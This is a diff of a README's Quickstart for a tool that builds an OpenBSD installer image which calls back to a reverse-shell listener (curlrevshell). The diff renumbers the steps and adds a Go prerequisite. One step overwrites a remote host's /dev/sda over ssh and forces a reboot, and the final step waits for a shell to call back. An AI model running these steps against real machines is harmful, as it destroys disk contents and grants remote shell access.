@@ -15,36 +15,37 @@ be sent in its own HTTPS request via [`output_query_adapter`](
 
 Quickstart
 ----------
-1.  Clone this repository somewhere running OpenBSD:
+1.  Have [Go](https://go.dev) installed.
+2.  Clone this repository somewhere running OpenBSD:
     ```sh
     git clone https://github.com/magisterquis/openbsd_installer_to_curlrevshell.git
     cd openbsd_installer_to_curlrevshell
     ```
-2.  Edit [`config.mk`](./config.mk) to have at least the correct address
+3.  Edit [`config.mk`](./config.mk) to have at least the correct address
     for curlrevshell, but also whatever other bits need changing.
     Variables can also be given to make at build time:
     ```sh
     vi config.mk
     ```
-3.  Build a miniroot image:
+4.  Build a miniroot image:
     ```sh
     make # Uses doas, sorry :|
     ```
-4.  In one shell, start [`output_query_adapter`](./src/cmd/output_query_adapter):
+5.  In one shell, start [`output_query_adapter`](./src/cmd/output_query_adapter):
     ```sh
     ./start.sh output_query_adapter
     ```
-5.  In another shell, start [`curlrevshell`](
+6.  In another shell, start [`curlrevshell`](
     https://github.com/magisterquis/curlrevshell):
     ```sh
     ./start.sh curlrevshell
     ```
-6.  Boot the miniroot image:
+7.  Boot the miniroot image:
     ```sh
     # This one's very situationally-dependent, but could be something like
     ssh root@test 'cat >/dev/sda && sync && echo b >/proc/sysrq-trigger' <miniroot_amd64_crs.img
     ```
-7.  Wait a bit for networking to come up and a shell to call back.
+8.  Wait a bit for networking to come up and a shell to call back.
 
 If all went well,
 the installer, if visible, should look like
